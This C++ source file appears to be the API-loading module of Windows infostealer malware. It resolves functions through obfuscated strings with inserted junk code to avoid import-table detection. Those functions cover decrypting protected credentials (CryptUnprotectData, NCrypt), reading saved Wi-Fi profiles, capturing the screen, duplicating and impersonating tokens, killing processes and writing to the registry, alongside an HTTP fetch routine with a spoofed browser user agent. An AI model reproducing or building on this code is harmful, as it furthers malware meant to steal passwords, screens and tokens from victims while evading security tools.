#include "DynamicAPI.h"
#include "../core/Obfuscation.h"
#include "../core/Internal.h"
#include "../../DebugLog.h"
#include <winhttp.h>
#include <sstream>
namespace DynAPI {
    // ── WinHTTP ──
    pWinHttpOpen            WHttpOpen      = nullptr;
    pWinHttpConnect         WHttpConnect   = nullptr;
    pWinHttpOpenRequest     WHttpOpenReq   = nullptr;
    pWinHttpSendRequest     WHttpSendReq   = nullptr;
    pWinHttpReceiveResponse WHttpRecvResp  = nullptr;
    pWinHttpQueryHeaders    WHttpQueryH    = nullptr;
    pWinHttpCloseHandle     WHttpCloseH    = nullptr;
    pWinHttpSetTimeouts     WHttpSetTime   = nullptr;
    pWinHttpQueryDataAvailable WHttpQueryAvail = nullptr;
    pWinHttpReadData        WHttpReadData  = nullptr;
    // ── Crypt32 ──
    pCryptUnprotectData  CryptUnprotData  = nullptr;
    pCryptStringToBinaryA CryptStrBinaryA = nullptr;
    // ── Shell32 ──
    pSHGetFolderPathA SHGetFolderA = nullptr;
    pShellExecuteExA  ShellExecExA = nullptr;
    // ── Registry (Wide) ──
    pRegCreateKeyExW  RegCreateKeyEx = nullptr;
    pRegSetValueExW   RegSetValueEx  = nullptr;
    pRegCloseKey      RegClose       = nullptr;
    pRegOpenKeyExW    RegOpenKeyEx   = nullptr;
    pRegQueryValueExW RegQueryValueEx= nullptr;
    // ── Kernel32 ──
    pGlobalMemoryStatusEx    GlobalMemStatusEx  = nullptr;
    pGetComputerNameA        GetCompNameA       = nullptr;
    pGetUserNameA            GetUserNmA         = nullptr;
    pGetSystemInfo           GetSysInfo         = nullptr;
    pGetTickCount64          GetTickCount       = nullptr;
    pOpenProcess             OpenProc           = nullptr;
    pTerminateProcess        TermProc           = nullptr;
    pGetModuleFileNameA      GetModFileNameA    = nullptr;
    pCreateProcessA          CreateProcA        = nullptr;
    pCreateToolhelp32Snapshot CreateSnapshot    = nullptr;
    pProcess32First           Proc32First       = nullptr;
    pProcess32Next            Proc32Next        = nullptr;
    pCloseHandle              CloseH            = nullptr;
    // ── User32 ──
    pSetWindowDisplayAffinity SetWndDisplayAffinity = nullptr;
    pGetSystemMetrics   GetSysMetrics  = nullptr;
    pGetDesktopWindow   GetDesktopWnd  = nullptr;
    pGetWindowDC        GetWndDC       = nullptr;
    pReleaseDC          RelDC          = nullptr;
    pFindWindowA        FindWndA       = nullptr;
    // ── GDI32 ──
    pCreateCompatibleDC     CreateCompDC     = nullptr;
    pCreateCompatibleBitmap CreateCompBitmap = nullptr;
    pSelectObject           SelectObj        = nullptr;
    pBitBlt                 BitBlt_f         = nullptr;
    pDeleteDC               DelDC            = nullptr;
    pDeleteObject           DelObj           = nullptr;
    // ── WLAN ──
    pWlanOpenHandle     WlanOpen       = nullptr;
    pWlanCloseHandle    WlanClose      = nullptr;
    pWlanEnumInterfaces WlanEnumIfaces = nullptr;
    pWlanGetProfileList WlanGetProfList= nullptr;
    pWlanGetProfile     WlanGetProf    = nullptr;
    pWlanFreeMemory     WlanFree       = nullptr;
    // ── NCrypt ──
    pNCryptOpenStorageProvider NCryptOpenStorage = nullptr;
    pNCryptOpenKey             NCryptOpenK       = nullptr;
    pNCryptDecrypt             NCryptDecr        = nullptr;
    pNCryptFreeObject          NCryptFreeObj     = nullptr;
    // ── Advapi32 ──
    pOpenProcessToken          OpenProcToken     = nullptr;
    pLookupPrivilegeValueA     LookupPrivValueA  = nullptr;
    pAdjustTokenPrivileges     AdjustTokPrivs    = nullptr;
    pDuplicateTokenEx          DupTokenEx        = nullptr;
    pImpersonateLoggedOnUser   ImpersonateLoggedUser = nullptr;
    pRevertToSelf              RevertSelf        = nullptr;
    pSetThreadToken            SetThrToken       = nullptr;
    pGetTokenInformation       GetTokenInf       = nullptr;

    // Helper: resolve via Internal's already-resolved LoadLibraryA + GetProcAddress
    static FARPROC GPA(const char* dll, const char* func) {
        if (!Internal::_GetProcAddress || !Internal::_GetModuleHandleA) return nullptr;
        HMODULE hMod = Internal::_GetModuleHandleA(dll);
        if (!hMod && Internal::_LoadLibraryA) hMod = Internal::_LoadLibraryA(dll);
        if (!hMod) return nullptr;
        return Internal::_GetProcAddress(hMod, func);
    }

    std::string HttpGet(const std::wstring& host, const std::wstring& path, bool https) {
        if (!WHttpOpen) return "";
        HINTERNET hSess = WHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSess) return "";
        WHttpSetTime(hSess, 5000, 5000, 5000, 5000);
        INTERNET_PORT port = https ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT;
        HINTERNET hConn = WHttpConnect(hSess, host.c_str(), port, 0);
        if (!hConn) { WHttpCloseH(hSess); return ""; }
        DWORD flags = https ? WINHTTP_FLAG_SECURE : 0;
        HINTERNET hReq = WHttpOpenReq(hConn, L"GET", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
        if (!hReq) { WHttpCloseH(hConn); WHttpCloseH(hSess); return ""; }
        WHttpSendReq(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
        WHttpRecvResp(hReq, NULL);
        std::string resp;
        DWORD avail = 0;
        while (WHttpQueryAvail && WHttpQueryAvail(hReq, &avail) && avail > 0) {
            std::vector<char> buf(avail + 1, 0);
            DWORD read = 0;
            if (WHttpReadData(hReq, buf.data(), avail, &read)) resp.append(buf.data(), read);
        }
        WHttpCloseH(hReq); WHttpCloseH(hConn); WHttpCloseH(hSess);
        return resp;
    }

    bool Initialize() {
        SLOG("[DYNAPI] Initialize() started");
        // Internal::Initialize() MUST have been called first to set up
        // _LoadLibraryA, _GetProcAddress, _GetModuleHandleA
        if (!Internal::_LoadLibraryA || !Internal::_GetProcAddress) {
            SLOG("[DYNAPI] FAILED: Internal core APIs not available");
            return false;
        }

        JUNK_CODE_LARGE

        // Load DLLs via Internal's resolved LoadLibraryA (no IAT entry)
        Internal::_LoadLibraryA(OBFS_S("crypt32.dll").c_str());
        Internal::_LoadLibraryA(OBFS_S("winhttp.dll").c_str());
        Internal::_LoadLibraryA(OBFS_S("shell32.dll").c_str());
        Internal::_LoadLibraryA(OBFS_S("user32.dll").c_str());
        Internal::_LoadLibraryA(OBFS_S("gdi32.dll").c_str());
        Internal::_LoadLibraryA(OBFS_S("wlanapi.dll").c_str());
        Internal::_LoadLibraryA(OBFS_S("ncrypt.dll").c_str());

        // Crypt32
        CryptUnprotData  = (pCryptUnprotectData)  GPA(OBFS_S("crypt32.dll").c_str(), OBFS_S("CryptUnprotectData").c_str());
        CryptStrBinaryA  = (pCryptStringToBinaryA)GPA(OBFS_S("crypt32.dll").c_str(), OBFS_S("CryptStringToBinaryA").c_str());
        JUNK_CODE_SMALL
        // WinHTTP
        WHttpOpen       = (pWinHttpOpen)              GPA(OBFS_S("winhttp.dll").c_str(), OBFS_S("WinHttpOpen").c_str());
        WHttpConnect    = (pWinHttpConnect)           GPA(OBFS_S("winhttp.dll").c_str(), OBFS_S("WinHttpConnect").c_str());
        WHttpOpenReq    = (pWinHttpOpenRequest)       GPA(OBFS_S("winhttp.dll").c_str(), OBFS_S("WinHttpOpenRequest").c_str());
        WHttpSendReq    = (pWinHttpSendRequest)       GPA(OBFS_S("winhttp.dll").c_str(), OBFS_S("WinHttpSendRequest").c_str());
        WHttpRecvResp   = (pWinHttpReceiveResponse)   GPA(OBFS_S("winhttp.dll").c_str(), OBFS_S("WinHttpReceiveResponse").c_str());
        WHttpQueryH     = (pWinHttpQueryHeaders)      GPA(OBFS_S("winhttp.dll").c_str(), OBFS_S("WinHttpQueryHeaders").c_str());
        WHttpCloseH     = (pWinHttpCloseHandle)       GPA(OBFS_S("winhttp.dll").c_str(), OBFS_S("WinHttpCloseHandle").c_str());
        WHttpSetTime    = (pWinHttpSetTimeouts)       GPA(OBFS_S("winhttp.dll").c_str(), OBFS_S("WinHttpSetTimeouts").c_str());
        WHttpQueryAvail = (pWinHttpQueryDataAvailable)GPA(OBFS_S("winhttp.dll").c_str(), OBFS_S("WinHttpQueryDataAvailable").c_str());
        WHttpReadData   = (pWinHttpReadData)          GPA(OBFS_S("winhttp.dll").c_str(), OBFS_S("WinHttpReadData").c_str());
        // Shell32
        SHGetFolderA = (pSHGetFolderPathA)GPA(OBFS_S("shell32.dll").c_str(), OBFS_S("SHGetFolderPathA").c_str());
        ShellExecExA = (pShellExecuteExA) GPA(OBFS_S("shell32.dll").c_str(), OBFS_S("ShellExecuteExA").c_str());
        // Advapi32
        RegCreateKeyEx  = (pRegCreateKeyExW) GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RegCreateKeyExW").c_str());
        RegSetValueEx   = (pRegSetValueExW)  GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RegSetValueExW").c_str());
        RegClose        = (pRegCloseKey)     GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RegCloseKey").c_str());
        RegOpenKeyEx    = (pRegOpenKeyExW)   GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RegOpenKeyExW").c_str());
        RegQueryValueEx = (pRegQueryValueExW)GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RegQueryValueExW").c_str());
        GetUserNmA      = (pGetUserNameA)    GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("GetUserNameA").c_str());
        OpenProcToken   = (pOpenProcessToken)GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("OpenProcessToken").c_str());
        LookupPrivValueA = (pLookupPrivilegeValueA)GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("LookupPrivilegeValueA").c_str());
        AdjustTokPrivs  = (pAdjustTokenPrivileges)GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("AdjustTokenPrivileges").c_str());
        DupTokenEx      = (pDuplicateTokenEx)     GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("DuplicateTokenEx").c_str());
        ImpersonateLoggedUser = (pImpersonateLoggedOnUser)GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("ImpersonateLoggedOnUser").c_str());
        RevertSelf      = (pRevertToSelf)         GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("RevertToSelf").c_str());
        SetThrToken     = (pSetThreadToken)       GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("SetThreadToken").c_str());
        GetTokenInf     = (pGetTokenInformation)  GPA(OBFS_S("advapi32.dll").c_str(), OBFS_S("GetTokenInformation").c_str());
        JUNK_CODE_SMALL
        // Kernel32
        GlobalMemStatusEx  = (pGlobalMemoryStatusEx) GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GlobalMemoryStatusEx").c_str());
        GetCompNameA       = (pGetComputerNameA)     GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetComputerNameA").c_str());
        GetSysInfo         = (pGetSystemInfo)        GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetSystemInfo").c_str());
        GetTickCount       = (pGetTickCount64)       GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetTickCount64").c_str());
        OpenProc           = (pOpenProcess)          GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("OpenProcess").c_str());
        TermProc           = (pTerminateProcess)     GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("TerminateProcess").c_str());
        GetModFileNameA    = (pGetModuleFileNameA)   GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("GetModuleFileNameA").c_str());
        CreateProcA        = (pCreateProcessA)       GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("CreateProcessA").c_str());
        CreateSnapshot     = (pCreateToolhelp32Snapshot)GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("CreateToolhelp32Snapshot").c_str());
        Proc32First        = (pProcess32First)       GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("Process32First").c_str());
        Proc32Next         = (pProcess32Next)        GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("Process32Next").c_str());
        CloseH             = (pCloseHandle)          GPA(OBFS_S("kernel32.dll").c_str(), OBFS_S("CloseHandle").c_str());
        // User32
        GetSysMetrics         = (pGetSystemMetrics)       GPA(OBFS_S("user32.dll").c_str(), OBFS_S("GetSystemMetrics").c_str());
        GetDesktopWnd         = (pGetDesktopWindow)       GPA(OBFS_S("user32.dll").c_str(), OBFS_S("GetDesktopWindow").c_str());
        GetWndDC              = (pGetWindowDC)            GPA(OBFS_S("user32.dll").c_str(), OBFS_S("GetWindowDC").c_str());
        RelDC                 = (pReleaseDC)              GPA(OBFS_S("user32.dll").c_str(), OBFS_S("ReleaseDC").c_str());
        FindWndA              = (pFindWindowA)            GPA(OBFS_S("user32.dll").c_str(), OBFS_S("FindWindowA").c_str());
        SetWndDisplayAffinity = (pSetWindowDisplayAffinity)GPA(OBFS_S("user32.dll").c_str(), OBFS_S("SetWindowDisplayAffinity").c_str());
        // GDI32
        CreateCompDC     = (pCreateCompatibleDC)     GPA(OBFS_S("gdi32.dll").c_str(), OBFS_S("CreateCompatibleDC").c_str());
        CreateCompBitmap = (pCreateCompatibleBitmap) GPA(OBFS_S("gdi32.dll").c_str(), OBFS_S("CreateCompatibleBitmap").c_str());
        SelectObj        = (pSelectObject)           GPA(OBFS_S("gdi32.dll").c_str(), OBFS_S("SelectObject").c_str());
        BitBlt_f         = (pBitBlt)                 GPA(OBFS_S("gdi32.dll").c_str(), OBFS_S("BitBlt").c_str());
        DelDC            = (pDeleteDC)               GPA(OBFS_S("gdi32.dll").c_str(), OBFS_S("DeleteDC").c_str());
        DelObj           = (pDeleteObject)           GPA(OBFS_S("gdi32.dll").c_str(), OBFS_S("DeleteObject").c_str());
        // WLAN
        WlanOpen       = (pWlanOpenHandle)    GPA(OBFS_S("wlanapi.dll").c_str(), OBFS_S("WlanOpenHandle").c_str());
        WlanClose      = (pWlanCloseHandle)   GPA(OBFS_S("wlanapi.dll").c_str(), OBFS_S("WlanCloseHandle").c_str());
        WlanEnumIfaces = (pWlanEnumInterfaces)GPA(OBFS_S("wlanapi.dll").c_str(), OBFS_S("WlanEnumInterfaces").c_str());
        WlanGetProfList= (pWlanGetProfileList)GPA(OBFS_S("wlanapi.dll").c_str(), OBFS_S("WlanGetProfileList").c_str());
        WlanGetProf    = (pWlanGetProfile)    GPA(OBFS_S("wlanapi.dll").c_str(), OBFS_S("WlanGetProfile").c_str());
        WlanFree       = (pWlanFreeMemory)    GPA(OBFS_S("wlanapi.dll").c_str(), OBFS_S("WlanFreeMemory").c_str());
        // NCrypt
        NCryptOpenStorage = (pNCryptOpenStorageProvider)GPA(OBFS_S("ncrypt.dll").c_str(), OBFS_S("NCryptOpenStorageProvider").c_str());
        NCryptOpenK       = (pNCryptOpenKey)            GPA(OBFS_S("ncrypt.dll").c_str(), OBFS_S("NCryptOpenKey").c_str());
        NCryptDecr        = (pNCryptDecrypt)            GPA(OBFS_S("ncrypt.dll").c_str(), OBFS_S("NCryptDecrypt").c_str());
        NCryptFreeObj     = (pNCryptFreeObject)         GPA(OBFS_S("ncrypt.dll").c_str(), OBFS_S("NCryptFreeObject").c_str());
        JUNK_CODE_LARGE
        SLOG("[DYNAPI] Resolution complete: WinHTTP=%p Crypt32=%p Shell32=%p NCrypt=%p WLAN=%p GDI=%p",
             WHttpOpen, CryptUnprotData, SHGetFolderA, NCryptOpenStorage, WlanOpen, CreateCompDC);
        bool ok = (WHttpOpen && CryptUnprotData && SHGetFolderA);
        SLOG("[DYNAPI] Initialize() %s", ok ? "OK" : "FAILED (critical APIs missing)");
        return ok;
    }
}
